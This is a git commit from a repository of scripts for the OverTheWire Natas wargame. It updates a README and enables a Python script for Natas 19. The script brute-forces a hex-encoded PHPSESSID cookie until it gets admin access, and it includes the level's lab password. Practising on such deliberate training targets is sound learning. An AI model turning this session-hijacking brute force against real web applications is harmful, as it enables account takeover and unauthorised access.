c659b6953ca4c2571850d0d8748f09721aacfd8e
TimDOtt <tott23@gmail.com>
2020-08-16 23:43:14 -0500

    Updated README.md

--- README.md
+++ README.md
@@ -5,3 +5,9 @@ sqli.py
 ==================
 
 This is a set of python scripts that I wrote to use SQL Injection on Natas 15, 16, and 17.
+
+
+sessionid_brute.py
+=========================
+
+Another set of python scripts. This time these are used to brute force what the admin sessionid is and use that to gain access to the next level for natas 18 and 19.
--- sessionid_brute.py
+++ sessionid_brute.py
@@ -29,31 +29,31 @@ import phpserialize
                                     #Natas 19
 ###############################################################################################
 
-# url = 'http://natas19.natas.labs.overthewire.org/'
-# username = 'natas19'
-# password = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'
-# data = {
-#     'username': 'admin',
-#     'password': '',
-# }
+url = 'http://natas19.natas.labs.overthewire.org/'
+username = 'natas19'
+password = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'
+data = {
+    'username': 'admin',
+    'password': '',
+}
 
-# ### Used the while loop below to determine what the session ID cookies pattern and length was
+### Used the while loop below to determine what the session ID cookies pattern and length was
 
-# # while True:
-# #     r = requests.post(url, auth=(username, password), data=data)
-# #     for c in r.cookies:
-# #         a = str(c.value)
-# #         print(a)
+# while True:
+#     r = requests.post(url, auth=(username, password), data=data)
+#     for c in r.cookies:
+#         a = str(c.value)
+#         print(a)
 
 
-# for i in range(641):
-#     f = (str(i) + '-admin').encode()
-#     g = binascii.hexlify(f).decode()
-#     cookie = dict(PHPSESSID=g)
-#     r = requests.get(url, auth=(username, password), cookies=cookie)
-#     print(cookie, end='\r')
-#     if 'You are an admin' in r.text:
-#         cookie=cookie
-#         print(f'Success!! The admin cookie is {cookie}')
-#         print(r.text)
-#         break
+for i in range(641):
+    f = (str(i) + '-admin').encode()
+    g = binascii.hexlify(f).decode()
+    cookie = dict(PHPSESSID=g)
+    r = requests.get(url, auth=(username, password), cookies=cookie)
+    print(cookie, end='\r')
+    if 'You are an admin' in r.text:
+        cookie=cookie
+        print(f'Success!! The admin cookie is {cookie}')
+        print(r.text)
+        break
